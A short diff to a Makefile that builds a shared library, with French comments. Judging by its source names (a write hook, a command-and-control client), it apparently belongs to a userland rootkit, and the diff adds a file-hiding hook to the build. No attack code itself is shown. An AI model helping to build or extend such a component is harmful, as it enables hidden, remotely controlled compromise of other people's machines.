@@ -2,7 +2,7 @@ CC = gcc
 CFLAGS = -Wall -fPIC -shared -ldl
 
 # Fichiers sources et objets
-SRCS = src/hook_write.c src/c2_client.c src/utils.c
+SRCS = src/hook_write.c src/c2_client.c src/utils.c src/hook_hide_files.c
 OBJS = $(SRCS:.c=.o)
 
 # Nom de la librairie partagée
